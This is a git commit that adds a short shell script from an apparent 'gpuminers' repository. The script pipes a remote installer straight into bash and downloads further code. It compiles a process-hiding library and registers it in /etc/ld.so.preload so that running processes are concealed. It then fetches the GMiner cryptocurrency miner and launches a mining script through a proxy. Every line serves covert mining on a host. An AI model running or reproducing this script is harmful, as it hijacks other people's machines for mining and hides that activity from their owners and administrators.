9e53a0b1219b7a42bd388ec110ddedcd7d4b746a
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-16 12:28:57 +0200

    Create start_gmiEthermWsocks5.sh

---
+++ start_gmiEthermWsocks5.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks5.sh | bash
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicGmi.zip
+unzip magicGmi.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.51/gminer_2_51_linux64.tar.xz
+tar -xvf gminer_2_51_linux64.tar.xz
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/gmiEthermWsocks.sh
+chmod +x gmiEthermWsocks.sh
+graftcp ./gmiEthermWsocks.sh
